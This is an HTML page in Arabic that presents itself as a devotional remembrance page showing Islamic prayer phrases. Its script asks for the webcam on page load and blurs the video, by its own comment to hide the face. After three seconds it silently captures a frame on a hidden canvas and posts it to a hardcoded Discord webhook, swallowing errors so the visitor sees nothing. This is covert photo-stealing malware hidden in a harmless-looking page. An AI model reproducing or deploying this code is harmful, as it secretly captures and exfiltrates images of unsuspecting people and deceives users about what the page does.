<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الذكر</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
            overflow: hidden;
            height: 100vh;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }

        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }

        video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; /* لضمان تغطية الفيديو للشاشة بالكامل */
            filter: blur(15px); /* تشويش الفيديو لإخفاء الوجه */
        }

        canvas {
            display: none; /* إخفاء الـ canvas الذي يتم عليه التقاط الصورة */
        }
    </style>
</head>
<body>
    <!-- النصوص التي طلبتها -->
    <p class="prayer">بسم الله الرحمن الرحيم</p>
    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>

    <!-- فيديو يعرض الكاميرا ولكن مع فلتر تشويش -->
    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream;

        // بدء تشغيل الفيديو من كاميرا الويب عند تحميل الصفحة
        async function startVideo() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // التقاط صورة تلقائيًا بعد 3 ثواني من تحميل الصفحة
                setTimeout(captureImage, 3000); // التقاط صورة بعد 3 ثواني
            } catch (err) {
                // في حالة حدوث خطأ، لا نعرض أي إشعارات
            }
        }

        // التقاط صورة تلقائيًا بعد 3 ثواني
        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            sendImageToWebhook(imageData);
        }

        // إرسال الصورة إلى الـ Webhook
        async function sendImageToWebhook(imageData) {
            try {
                await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: imageData })
                });
            } catch (err) {
                // لا شيء يتم عرضه إذا فشل الاتصال
            }
        }

        // بدء تشغيل الفيديو عند تحميل الصفحة
        window.onload = startVideo;
    </script>

</body>
</html>
